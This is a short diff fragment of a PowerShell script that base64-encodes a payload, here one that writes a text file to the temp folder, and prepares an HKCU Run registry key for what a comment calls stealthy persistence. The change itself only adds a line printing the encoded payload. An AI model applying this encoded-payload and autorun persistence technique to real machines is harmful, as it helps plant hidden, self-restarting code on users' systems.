@@ -6,6 +6,8 @@ $payload = "Set-Content -Path `"$env:TEMP\sysinfo.txt`" -Value `"Hello again Old
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encodedPayload = [Convert]::ToBase64String($bytes)
 
+Write-Host $encodedPayload
+
 # Persistence via Registry (Stealthy) New-ItemProperty -Path "HKCU:
 # Define the registry path
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
